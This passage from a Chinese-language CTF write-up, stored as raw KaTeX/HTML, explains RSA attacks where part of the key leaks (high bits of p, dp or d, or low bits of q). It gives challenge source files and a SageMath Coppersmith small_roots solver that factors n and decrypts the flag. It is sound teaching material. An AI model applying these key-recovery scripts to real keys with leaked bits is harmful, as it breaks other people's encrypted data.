stretchy="false">(</mo><mtext>即根的上限</mtext><mo stretchy="false">)</mo><mtext>为</mtext><msup><mn>2</mn><mn>200</mn></msup><mtext>次幂</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>而</mtext><mi>β</mi><mtext>取</mtext><mn>0.13</mn><mtext>到</mtext><mn>0.50</mn><mtext>都可以</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}这题我们就可以直接设p的低位为x\\这样我们就可以表示出p\\p = leak &lt;&lt; 200 + x=p_{high}+x\\我们可以从题目得到x的大小为200位\\所以我们规定X(即根的上限)为2^{200}次幂\\而\beta取0.13到0.50都可以\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.200000000000001em;vertical-align:-3.35em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.850000000000001em;"><span style="top:-6.010000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">题</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">设</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">低</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">x</span></span></span><span style="top:-4.810000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">出</span><span class="mord mathnormal">p</span></span></span><span style="top:-3.6100000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">从</span><span class="mord cjk_fallback">题</span><span class="mord cjk_fallback">目</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">为</span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord cjk_fallback">位</span></span></span><span style="top:-1.2100000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">规</span><span class="mord cjk_fallback">定</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mopen">(</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">根</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">限</span><span class="mclose">)</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">幂</span></span></span><span style="top:-0.009999999999999953em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">而</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mord cjk_fallback">取</span><span class="mord">0</span><span class="mord">.</span><span class="mord">1</span><span class="mord">3</span><span class="mord cjk_fallback">到</span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span><span class="mord">0</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>解密就像这样即可，因为我们这时使用的是<code>coppersmith攻击中</code>，给定$ \beta $ ,快速求出模某个<code>b</code>意义下较小的根，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>≥</mo><msup><mi>n</mi><mi>β</mi></msup></mrow><annotation encoding="application/x-tex">b ≥ n^\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span></span></span></span></span></span></span></span></span></span></span>。所以我们必须要指定<code>small_roots</code>中的参数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">c =  <span class="number">113586177374556404023302519526754665470570871476581572924010485271609182939576292258309693919183665334593269032771168258676196238354553238207372511638353179203781100360164950899879081096534890623159302893909393987089255020158056119954592555987794050357729528077439336645285541296688606433920178147114273163214</span></span><br><span class="line">p3_high = <span class="number">6988520536508181139792486524710394841324279945751362186371062878730048665522475016854515443490</span></span><br><span class="line">p3_high = p3_high &lt;&lt; <span class="number">200</span></span><br><span class="line">n3 = <span class="number">117400480938142315180437859683247427996874734449806782078398939334361106314549758122280645558538068023461810390291406250149045673033058236602564577080271495334738508492592434662896092890777780831354145755712206139360655422348268610020323769810399146777354043835879906538618644988182234583974095999379431384971</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">PR.&lt;x&gt;  = PolynomialRing(Zmod(n3))</span><br><span class="line">p = p3_high + x</span><br><span class="line">p = p.monic()</span><br><span class="line">p = p(p.small_roots(X=<span class="number">2</span>^<span class="number">200</span>,beta=<span class="number">0.2</span>))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q = n3//<span class="built_in">int</span>(p)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n3)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="题目3_已知d的高位"><a class="markdownIt-Anchor" href="#题目3_已知d的高位"></a> 题目3_已知d的高位</h2><ul><li><a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130171830">d低位攻击 &amp; d高位攻击-CSDN博客</a></li></ul><h2 id="题目4_已知dp高位"><a class="markdownIt-Anchor" href="#题目4_已知dp高位"></a> 题目4_已知dp高位</h2><ul><li>题目如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">7621</span></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">dp = d % (p - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(dp &gt;&gt; <span class="number">200</span>)</span><br><span class="line"><span class="built_in">print</span>(c, e, n)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c = 46735962204857190520476434898881001530665718155698898882603422023484998388668858692912250418134186095459060506275961050676051693220280588047233628259880712415593039977585805890920089318643002597837000049626154900908543384761210358835843974072960080857150727010985827690190496793207012355214605393036388807616</span></span><br><span class="line"><span class="string">e = 7621</span></span><br><span class="line"><span class="string">n = 140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="题型2_已知高低位"><a class="markdownIt-Anchor" href="#题型2_已知高低位"></a> 题型2_已知高低位</h1><h2 id="题目1_已知p高位和q低位"><a class="markdownIt-Anchor" href="#题目1_已知p高位和q低位"></a> 题目1_已知p高位和q低位</h2><ul><li><p>题目来源：[鹤城杯 2021]BabyRSA。[<a href="https://www.nssctf.cn/problem/451">鹤城杯 2021]BabyRSA | NSSCTF</a></p></li><li><p>题目附件如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">hint1 = p &gt;&gt; <span class="number">724</span></span><br><span class="line">hint2 = q % (<span class="number">2</span> ** <span class="number">265</span>)</span><br><span class="line">ct = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(hint1)</span><br><span class="line"><span class="built_in">print</span>(hint2)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">hint1 = 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line"><span class="string">hint2 = 40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line"><span class="string">n = 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line"><span class="string">ct = 19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这题本质上还是已知p的位数，求利用<code>small_roots</code>求解<code>p</code>，其中我们是可以知道<code>p</code>的高<code>300</code>位的。而根据<code>hint2</code>我们其实可以求出<code>p</code>的低<code>265</code>位。推到过程如下：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>其实我们已知</mtext><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mi>q</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>此时我们设</mtext><msub><mi>p</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mtext>为</mtext><mi>p</mi><mtext>的低</mtext><mn>265</mn><mtext>位</mtext><mo separator="true">,</mo><msub><mi>p</mi><mi>r</mi></msub><mtext>为</mtext><mi>p</mi><mtext>的剩余位数</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>所以有</mtext><mi>p</mi><mo>=</mo><msup><mn>2</mn><mn>265</mn></msup><mo>∗</mo><msub><mi>p</mi><mi>r</mi></msub><mo>+</mo><msub><mi>p</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>同理得</mtext><mi>q</mi><mo>=</mo><msup><mn>2</mn><mn>265</mn></msup><mo>∗</mo><msub><mi>q</mi><mi>r</mi></msub><mo>+</mo><msub><mi>q</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>可得到</mtext><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo>∗</mo><msub><mi>p</mi><mi>r</mi></msub><mo>+</mo><msub><mi>p</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo>∗</mo><msub><mi>q</mi><mi>r</mi></msub><mo>+</mo><msub><mi>q</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>展开可以得到如下式子</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>n</mi><mo>=</mo><msup><mn>2</mn><mn>530</mn></msup><mo>∗</mo><msub><mi>p</mi><mi>r</mi></msub><mo>∗</mo><msub><mi>q</mi><mi>r</mi></msub><mo>+</mo><msup><mn>2</mn><mn>265</mn></msup><mo>∗</mo><msub><mi>p</mi><mi>r</mi></msub><mo>∗</mo><msub><mi>q</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>+</mo><msub><mi>p</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>∗</mo><msup><mn>2</mn><mn>265</mn></msup><mo>∗</mo><msub><mi>q</mi><mi>r</mi></msub><mo>+</mo><msub><mi>p</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>∗</mo><msub><mi>q</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这时我们将</mtext><mi>n</mi><mtext>模一个</mtext><msup><mn>2</mn><mn>265</mn></msup><mtext>就会得到</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>n</mi><mo>≡</mo><msub><mi>p</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>∗</mo><msub><mi>q</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>此时我们已知</mtext><mi>n</mi><mtext>和</mtext><msub><mi>q</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo separator="true">,</mo><mtext>计算出</mtext><msub><mi>p</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mtext>就没有问题</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>≡</mo><mi>n</mi><mo>∗</mo><msubsup><mi>q</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}其实我们已知n = p*q\\此时我们设p_{low}为p的低265位,p_r为p的剩余位数\\所以有p = 2^{265}*p_r + p_{low}\\同理得q = 2^{265}*q_r + q_{low}\\可得到n = p*q=(2^{265}*p_r+p_{low})*(2^{265}*q_r+q_{low})\\展开可以得到如下式子:\\n=2^{530}*p_r*q_r+2^{265}*p_r*q_{low}+p_{low}*2^{265}*q_r+p_{low}*q_{low}\\这时我们将n模一个2^{265}就会得到\\n\equiv p_{low}*q_{low}~mod~(2^{265})\\此时我们已知n和q_{low},计算出p_{low}就没有问题\\p_{low}\equiv n*q_{low}^{-1}~mod(2^{265})\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:13.214239em;vertical-align:-6.3571195em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.857119499999999em;"><span style="top:-9.017119499999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">知</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span><span style="top:-7.817119499999999em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">设</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">低</span><span class="mord">2</span><span class="mord">6</span><span class="mord">5</span><span class="mord cjk_fallback">位</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">剩</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">数</span></span></span><span style="top:-6.6171194999999985em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">有</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.417119499999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.217119499999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" 